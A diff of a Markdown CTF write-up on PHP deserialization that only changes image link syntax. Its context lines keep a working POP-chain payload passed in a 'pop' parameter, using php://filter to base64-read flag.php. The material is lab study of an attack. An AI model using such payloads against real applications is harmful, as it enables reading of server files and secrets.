@@ -1,4 +1,4 @@
-![[Pasted image 20221129094955.png|500]]
+![](<./img/Pasted image 20221129094955.png>)
 
 ---
 首页长这样
@@ -85,8 +85,8 @@ echo serialize($s);
 /?pop=O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
 ```
 
-![[Pasted image 20221129110811.png]]
+![](<./img/Pasted image 20221129110811.png>)
 
-![[Pasted image 20221129110830.png]]
+![](<./img/Pasted image 20221129110830.png>)
 
 #Web #PHP #反序列化 
